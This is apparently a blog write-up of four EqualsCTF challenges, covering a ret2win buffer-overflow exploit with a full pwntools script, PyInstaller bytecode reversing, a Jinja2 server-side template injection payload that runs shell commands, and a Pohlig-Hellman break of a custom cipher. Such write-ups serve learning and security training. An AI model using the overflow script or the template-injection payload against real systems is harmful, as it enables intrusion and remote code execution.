---
title: EqualsCTF
date: 2026-06-20
categories: [EqualsCTF, Write-up]
tags: [write-up, pwn, reverse-engineering, web, crypto]
author: Mohamad Helmi
description: "EqualsCTF challenges write-up"
---
# Intro
Joined EQCTF untuk vibe dan jalan-jalan di APU🙂.

## dogwalker (Pwn)
Binary `dogwalker` adalah ELF 64-bit PIE, server boleh disambung melalui `nc 135.181.88.229 20003`.

### Enumeration
```
$ file dogwalker
dogwalker: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec dogwalker
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
```

Protections aktif:
- **PIE** — base address diacak setiap run (ASLR)
- **NX** — stack tidak executable
- **Tiada stack canary** — buffer overflow boleh langsung overwrite return address

Disassembly mendedahkan 4 fungsi utama (offset dari base):

| Fungsi | Offset | Keterangan |
|---|---|---|
| `win()` | `0x11a9` | Buka `flag.txt`, print flag |
| `bark()` | `0x12e1` | Print "woof woof!" |
| `groom()` | `0x12f7` | **VULNERABLE** — buffer overflow |
| `main()` | `0x1345` | Print PIE leak, routing ke menu |

### Analysis
**PIE Leak (ASLR Bypass).** `main()` print alamat fungsi `bark()` secara terus:

```c
printf("whistle: %p\n", &bark);
```

Output contoh:
```
whistle: 0x608440c142e1
```

Base address binary boleh dikira:
```python
base = leaked_bark_addr - 0x12e1
```

**Buffer Overflow dalam `groom()`.**

```c
// groom() — stack layout:
// rbp-0x50  = buffer (80 bytes)
// rbp+0x00  = saved rbp (8 bytes)
// rbp+0x08  = return address

read(0, rbp-0x50, 0xc8);  // baca 200 bytes ke dalam 80-byte buffer!
```

Overflow: **200 - 80 = 120 bytes** boleh overwrite ke luar buffer. Return address ada pada **offset 88** dari awal buffer (`0x50 + 0x8`).

### Exploitation
Strategi serangan:

1. Receive output `whistle: <addr>` → kira `base`
2. Hantar `'1'` → masuk `groom()`
3. Hantar payload overflow: `[ 'A' * 88 ] [ ret gadget ] [ win() address ]`

`ret` gadget diperlukan untuk **16-byte stack alignment** sebelum `win()` dipanggil (SSE requirement dalam x86-64). Ditemui pada offset `0x1016` via `objdump`:
```
1016: c3   ret
```

```python
from pwn import *

BINARY = "./dogwalker"
HOST, PORT = "135.181.88.229", 20003

elf = ELF(BINARY)
context.binary = elf

io = remote(HOST, PORT)

# Step 1: Terima PIE leak
io.recvuntil(b"whistle: ")
leak = int(io.recvline().strip(), 16)
base = leak - 0x12e1
log.info(f"base: {hex(base)}")

win_addr   = base + 0x11a9
ret_gadget = base + 0x1016

# Step 2: Pilih menu '1' → groom()
io.recvuntil(b"2) Bark and leave\n")
io.sendline(b"1")

# Step 3: Hantar overflow payload
io.recvuntil(b"Collar name:")
payload  = b"A" * 88          # padding
payload += p64(ret_gadget)    # stack alignment
payload += p64(win_addr)      # jump to win()
io.send(payload)

output = io.recvall(timeout=5)
print(output.decode())
io.close()
```

Output:
```
Good dog! Here is your treat: EQCTF{1_4M_Pwn_M4sT3r_w0oF_wo0f}
```

### Flag
```
EQCTF{1_4M_Pwn_M4sT3r_w0oF_wo0f}
```

### Key Takeaways
Tanpa stack canary, satu PIE leak je dah cukup untuk hitung semua alamat yang diperlukan untuk ret2win. Kena ingat juga pasal 16-byte stack alignment kalau target function guna SSE instructions — kalau tak, `win()` akan crash sebelum sampai `read()`.

---

## doggy (Reverse Engineering)
Binary `doggy-flag-checker` adalah ELF 64-bit, stripped.

### Enumeration
```
$ file doggy-flag-checker
doggy-flag-checker: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped

$ ls -lh doggy-flag-checker
-rwxrwxr-x 1 kali kali 8.6M Jun 20 ...
```

Saiz 8.6 MB adalah sangat besar untuk binary biasa. `strings` mendedahkan:

```
PyRun_SimpleStringFlags
_MEIPASS
pyi-python-flag
libpython3.10.so.1.0
```

**Kesimpulan: Binary ini adalah PyInstaller bundle** — Python 3.10 script yang dikompil dan dipack ke dalam satu ELF executable. Logik sebenar ada dalam embedded Python bytecode.

### Analysis
**Step 1: Ekstrak PyInstaller Bundle**

```bash
python3 pyinstxtractor.py doggy-flag-checker
```

Output:
```
[+] Processing doggy-flag-checker
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 8,567,890 bytes
[+] Found 12 files in CArchive
[+] Beginning extraction...
[+] Possible entry point: challenge.pyc
```

Entry point: `challenge.pyc`

**Step 2: Decompile Bytecode**

Host Python (3.13) tidak boleh load bytecode Python 3.10 secara langsung. Guna `xdis` dalam virtualenv:

```bash
python3 -m venv /tmp/venv310
source /tmp/venv310/bin/activate
pip install xdis

# Jalankan dari /tmp untuk elak conflict dengan struct.pyc yang diekstrak
python3 -c "
import xdis
import marshal, sys
sys.path.insert(0, '/tmp')
with open('/path/to/challenge.pyc', 'rb') as f:
    f.read(16)  # skip magic + timestamp + size
    code = marshal.loads(f.read())
print(code.co_consts)
print(code.co_names)
"
```

**Step 3: Reverse Validation Logic**

Dari bytecode, logik check flag adalah:

```python
_k = (137, 64, 129, 97, ...)    # XOR key (4 bytes, cycling)
_p = (26, 32, 18, 17, ...)      # Permutation array (34 elemen)
_t = (162, 127, 177, 9, ...)    # Target bytes (34 elemen)

def check_flag(flag):
    if len(flag) != 34:
        return False
    shuffled = [flag[i] for i in _p]
    xored = [ord(c) ^ _k[j % 4] for j, c in enumerate(shuffled)]
    return xored == list(_t)
```

### Exploitation
Untuk inverse logik di atas:

1. `_p` adalah permutation of `0..33` → ia mempunyai inverse yang unik
2. Untuk setiap posisi `j`: `shuffled[j] = chr(_t[j] ^ _k[j % 4])`
3. Kemudian: `flag[_p[j]] = shuffled[j]`

```python
_k = (137, 64, 129, 97)          # XOR key
_p = [26, 32, 18, 17, ...]       # permutation (34 elemen)
_t = [162, 127, 177, 9, ...]     # target (34 elemen)

flag = ['?'] * 34
for j in range(34):
    char = chr(_t[j] ^ _k[j % 4])
    flag[_p[j]] = char

print(''.join(flag))
```

Verification:
```bash
$ echo 'EQCTF{+his_is_py+h0n_3x3cu+4bl3??}' | ./doggy-flag-checker
flag: correct!
```

> `+` dalam flag adalah leetspeak untuk huruf `t` (iaitu "this" dan "python" dan "executable")

### Flag
```
EQCTF{+his_is_py+h0n_3x3cu+4bl3??}
```

### Key Takeaways
Saiz binary yang luar biasa besar (8.6 MB untuk satu flag checker) adalah signal kuat untuk PyInstaller bundle. Sebaik diekstrak, validation logic dalam bytecode boleh dianalisis terus tanpa perlu disassemble assembly x86 langsung — buang masa kalau cuba reverse `_start` punya stub C wrapper, sebab logik sebenar ada dalam `.pyc`.

---

## Web badge generator (Server-Side Template Injection)
Target: `http://f760369e-d944-46a0-a644-95ff400249da.chal.1v1.eqctf.com/`, stack Python 3.12 + Flask + Jinja2.

### Enumeration
Source code diberikan dalam direktori `dist/`. Fail utama: `app.py`. Route `/generate` menerima tiga field dari form POST: `name` (max 120 chars), `department`, `employee_id`.

Kod yang vulnerable:

```python
@app.route("/generate", methods=["POST"])
def generate():
    name = request.form.get("name", "").strip()
    department = request.form.get("department", "Web").strip() or "Web"
    employee_id = request.form.get("employee_id", "").strip()

    # Vulnerable: user input diinterpolate terus ke dalam template string
    badge_template = f"""
    <div class="badge-card">
        ...
        <h2 class="badge-name">{name}</h2>
        <p class="badge-dept">{department}</p>
        <p class="badge-meta">Competitor ID: {employee_id or "Pending"}</p>
        ...
    </div>
    """

    badge_html = app.jinja_env.from_string(badge_template).render()  # ← SSTI!
```

### Analysis
Punca masalah: input pengguna dimasukkan terus ke dalam f-string Python, kemudian string tersebut dihantar ke `jinja_env.from_string().render()` untuk di-render sebagai Jinja2 template.

Ini bermaksud jika input mengandungi sintaks Jinja2 seperti `{{ ... }}`, ia akan **dilaksanakan oleh template engine** di server.

Aliran data:
```
user input → f-string interpolation → Jinja2 from_string() → render() → RCE
```

Field `department` dan `employee_id` tiada had panjang, menjadikannya sasaran ideal untuk payload yang lebih panjang.

### Exploitation
Jinja2 SSTI membenarkan akses kepada Python object hierarchy. Payload untuk execute OS command:

```
{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}
```

Penjelasan payload:
1. `config` — objek Flask config yang sedia ada dalam Jinja2 context
2. `.__class__.__init__.__globals__` — akses ke global namespace Python melalui object hierarchy
3. `['os']` — dapatkan modul `os` dari namespace
4. `.popen('cat /app/flag.txt').read()` — jalankan shell command dan baca output

Payload dihantar melalui field `department`:

```bash
curl -X POST "http://<target>/generate" \
  --data-urlencode "name=test" \
  --data-urlencode "department={{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}" \
  --data-urlencode "employee_id=1"
```

Server render payload sebagai Jinja2 expression dan output flag terus dalam HTML badge:

```html
<p class="badge-dept">EQCTF{SST1_1s_F0r_Th3_We4kl1ngs_GG3z}</p>
```

### Flag
```
EQCTF{SST1_1s_F0r_Th3_We4kl1ngs_GG3z}
```

### Key Takeaways
Jangan sekali-kali bina template string dengan f-string yang ada user input sebelum dihantar ke `jinja_env.from_string()`. Fix yang betul guna `render_template()` dengan context variables berasingan:

```python
# SELAMAT — gunakan template file dengan context variables
return render_template("badge.html", name=name, department=department)
```

Kalau perlu render dynamic template, sanitize/escape input terlebih dahulu dan jangan sekali-kali interpolate raw user input ke dalam string yang akan di-render oleh template engine.

---

## QR (Crypto)
Files diberikan: `challenge.py`, `encrypted_flag.dat` (51 bytes).

### Enumeration
Source code `challenge.py` mendedahkan custom cipher dengan parameter berikut:

```python
P  = 0x964b061f035604101d58d216b74546699   # ~129-bit prime modulus
g  = 101                                    # base for discrete exponentiation
a  = 0xb56a3be5dba5d16f78ce1db74cf535f0
b  = 0xd18594a9023bced7e42a4694620a253a
c  = 0x913edcf2828cca16c93ecc87215995a0
IV = 0xc6ed7e913d0bfac20fe6d01607871b8c
# d <= 500  ← satu-satunya unknown parameter
```

Proses enkripsi setiap block:

```python
prev_c = IV
for i in range(0, len(payload), 16):
    block        = bytes_to_long(payload[i:i+16])
    cbc_mask     = prev_c & ((1 << 128) - 1)
    chained_block = block ^ cbc_mask                        # CBC chaining
    core         = pow(g, chained_block, P)                 # exponentiation mod P
    mask         = (a*i**3 + b*i**2 + c*i + d) % P          # polynomial mask
    C            = (core + mask) % P
    fw.write(long_to_bytes(C, 17))
    prev_c = C
```

Ciphertext `encrypted_flag.dat` mengandungi **3 block × 17 bytes = 51 bytes** jumlah, bermakna 48 bytes plaintext.

### Analysis
Dua kelemahan ditemui:

**1. Parameter `d` sangat kecil (`d <= 500`)** — hanya 501 nilai yang mungkin, membolehkan brute-force.

**2. `P-1` adalah B-smooth (largest prime factor = 67)** — factoring `P-1` mendedahkan ia mempunyai faktor-faktor yang sangat kecil:

```
P - 1 = 2^k * 3^j * 5^i * ... * 67^m   (semua faktor prima ≤ 67)
```

Ini bermakna **Pohlig-Hellman** boleh menyelesaikan discrete logarithm dalam kumpulan Zp* dengan serta-merta, walaupun P adalah 129-bit.

### Exploitation
**Step 1: Factor P-1**

```python
from sympy import factorint
P = 0x964b061f035604101d58d216b74546699
print(factorint(P - 1))
# → semua faktor prima ≤ 67 (B-smooth)
```

**Step 2: Brute-force `d` (0 hingga 500)**

```python
from sympy.ntheory.residue_ntheory import discrete_log
from Crypto.Util.number import long_to_bytes

with open('encrypted_flag.dat', 'rb') as f:
    ct = f.read()

blocks_c = [int.from_bytes(ct[i*17:(i+1)*17], 'big') for i in range(3)]

for d in range(501):
    mask0 = d % P  # index=0, so a*0 + b*0 + c*0 + d = d
    core0 = (blocks_c[0] - mask0) % P
    try:
        chained0 = discrete_log(P, core0, g)  # Pohlig-Hellman auto
    except:
        continue
    block0 = chained0 ^ (IV & ((1 << 128) - 1))
    plaintext0 = long_to_bytes(block0)
    if all(32 <= b < 127 for b in plaintext0):
        print(f"d = {d}, block0 = {plaintext0}")
        break
```

Hasil: **d = 321**, block 0 = `fQxBSXTMmFXvu0Tg` (16-byte random prefix — bukan literal `<somedata>`).

**Step 3: Decrypt semua blocks**

```python
d = 321
prev_c = IV
plaintext = b""

for i, C in enumerate(blocks_c):
    mask = (a * i**3 + b * i**2 + c * i + d) % P
    core = (C - mask) % P
    chained = discrete_log(P, core, g)
    cbc_mask = prev_c & ((1 << 128) - 1)
    block = chained ^ cbc_mask
    plaintext += long_to_bytes(block, 16)
    prev_c = C

print(plaintext.rstrip(b'\x00'))
```

Output:
```
b'fQxBSXTMmFXvu0TgEQCTF{t4rp1t_qr_c0d3_m4dn3ss}\x00\x00'
```

Plaintext penuh:
- **16 bytes random prefix**: `fQxBSXTMmFXvu0Tg` (ini yang disembunyikan sebagai `<somedata>` dalam comment)
- **Flag**: `EQCTF{t4rp1t_qr_c0d3_m4dn3ss}`
- **Padding**: null bytes

> **Note:** `b"<somedata>"` dalam source comment adalah placeholder sahaja — prefix sebenar adalah 16 bytes rawak, bukan literal string tersebut. Ini adalah decoy untuk menghalang serangan known-plaintext mudah.

### Flag
```
EQCTF{t4rp1t_qr_c0d3_m4dn3ss}
```

### Key Takeaways
Modulus 129-bit nampak selamat di permukaan, tapi kalau `P-1` boleh difactor kepada faktor-faktor kecil (B-smooth), Pohlig-Hellman boleh selesaikan discrete log dalam masa yang singkat — tak kira berapa besar pun P. Parameter `d` yang dibatasi kecil (`<= 500`) menambah lubang kedua yang boleh terus di-brute-force selepas DLP diselesaikan untuk setiap kemungkinan.